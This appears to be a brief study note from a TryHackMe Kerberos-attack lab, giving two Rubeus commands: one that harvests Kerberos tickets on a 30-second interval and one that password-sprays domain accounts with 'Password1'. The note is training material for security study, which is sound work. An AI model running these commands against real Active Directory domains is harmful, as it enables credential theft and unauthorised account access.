Links: [[00 - Global Index (Start Here!)]] [[03 - Try Hack Me]] [[Active Directory]] [[Attacking Kerberos]]
# [03 - Harvesting and Brute-Forcing Tickets with Rubeus]
## Notes
---
Password harvesting
```powershell
Rubeus.exe harvest /interval:30
```

Password Spraying
```powershell
Rubeus.exe brute /password:Password1 /noticket
```